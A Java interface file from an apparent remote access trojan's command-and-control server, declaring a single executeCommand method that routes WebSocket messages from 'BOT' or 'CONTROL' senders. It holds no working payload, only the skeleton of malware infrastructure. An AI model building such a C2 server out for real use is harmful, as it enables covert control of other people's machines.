package devs.alex.sah.rat.c2server.services;

import devs.alex.sah.rat.c2server.models.Message;
import org.springframework.web.socket.WebSocketSession;

import java.nio.ByteBuffer;

public interface ServerEndpoint {

    void executeCommand(Sender sender, WebSocketSession session, Message<?> message);

    enum Sender{ BOT, CONTROL }
}
